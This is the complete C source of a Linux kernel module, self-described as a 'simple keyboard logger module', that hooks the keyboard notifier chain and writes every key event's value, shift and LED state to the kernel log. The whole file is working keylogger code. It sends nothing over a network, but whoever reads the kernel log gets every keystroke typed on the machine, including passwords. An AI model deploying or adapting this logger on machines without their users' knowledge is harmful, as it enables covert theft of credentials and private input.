#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/notifier.h>

static int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)data;
    printk("down(%x) shift(%x) led(%x) value(%x)\n", param->down, param->shift, param->ledstate, param->value);
    return NOTIFY_OK;
}


static struct notifier_block keyboard_notifier;

static int k_key_logger_init(void) {
    keyboard_notifier.notifier_call = keyboard_callback;
    register_keyboard_notifier(&keyboard_notifier);
    return 0;
}

static void k_key_logger_exit(void) {
	unregister_keyboard_notifier(&keyboard_notifier);
}

module_init(k_key_logger_init);
module_exit(k_key_logger_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Frank Han");
MODULE_DESCRIPTION("simple keyboard logger module");
